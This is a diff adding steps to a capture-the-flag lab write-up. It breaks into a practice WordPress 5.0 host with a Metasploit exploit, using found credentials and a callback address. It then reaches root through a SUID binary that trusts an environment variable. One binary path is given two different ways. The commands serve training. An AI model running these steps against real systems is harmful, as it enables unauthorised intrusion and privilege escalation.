@@ -213,3 +213,78 @@ wordpress 5.0 → Searches for exploits specifically related to WordPress versio
 ```
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/1b6d092b-aa32-4a8a-aae0-a4ec0994fd62"></picture><br>This has the same code EDB-ID 49512 and also uses python for its execution.</h3>
 
+### **- Now with the help of METASPLOIT we will use this vulnerability to gain access to the victim machine.**
+```bash
+msfdb init && msfconsole
+```
+```bash
+msfdb init → Initializes the Metasploit database.
+- Sets up a PostgreSQL database for Metasploit.
+- Allows you to store results, track exploited hosts, and improve search performance.
+
+&& → Runs the second command only if the first one succeeds.
+
+msfconsole → Starts the Metasploit console (msfconsole).
+This is the main interface for searching, configuring, and executing exploits.
+```
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e8d50d09-ecc8-4088-a44f-2ef821750154"></picture><br></h3>
+
+### **- Now we will look for a sploit to be able to breach WordPress 5.0:**
+
+```bash
+search wordpress 5.0
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/7d759611-6a36-4730-9360-1b6c5991a5cc"></picture><br></h3>
+
+### **- Now we will select our sploit and configure it as requested:**
+
+```bash
+use 0
+show options
+```
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0d6c8c84-6fc8-4652-86b1-659462ccfdd9"></picture><br>As shown in the image we are asked for certain information that we already possess</h3>
+
+### **- We enter the information:**
+
+```bash
+set PASSWORD cutiepie1
+set RHOSTS blog.thm
+set USERNAME kwheel
+set LHOST 10.21.118.81
+```
+```bash
+show options
+```
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c551ccd2-adca-43b2-832a-ae36fd829d6d"></picture><br>now we only have to run the sploit</h3>
+
+```bash
+run
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/f28b17bb-98ac-4f3e-b014-ca69f3297bda"></picture><br>Now we have to do some research to find a way to escalate privileges.</h3>
+
+<hr style="border-color:red;"><h1 align="center"></h1>
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e2e6bf7d-8d71-4323-8de8-a381eebf1d87"></picture><br>Once inside we go to the directory “/home” to see the users of this system and thus be able to see what this user is working on and what kind of permissions he/she has.</h3>
+
+### **- Analyzing SUID permissions**
+```bash
+find / -perm -4000 2>/dev/null | grep -v snap
+```
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/d4706afc-c18c-4d4b-a4c9-0daf1a3a7e6e"></picture><br>I saw an interesting SUID binary /usr/bin/checker.</h3>
+
+### **- when running the binary it showed this.**
+```bash
+/usr/sbin/checker
+```
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/ef8c291a-7c78-46e1-9eda-277740a7b0d6"></picture><br>Is checking if the environment variable admin exists.</h3>
+
+### **- as the variable does not exist, we will create it:**
+```bash
+export admin=1
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/ea94a3d2-0cc2-4499-a18d-d99b98bb9d18"></picture><br>we are already the root user</h3>
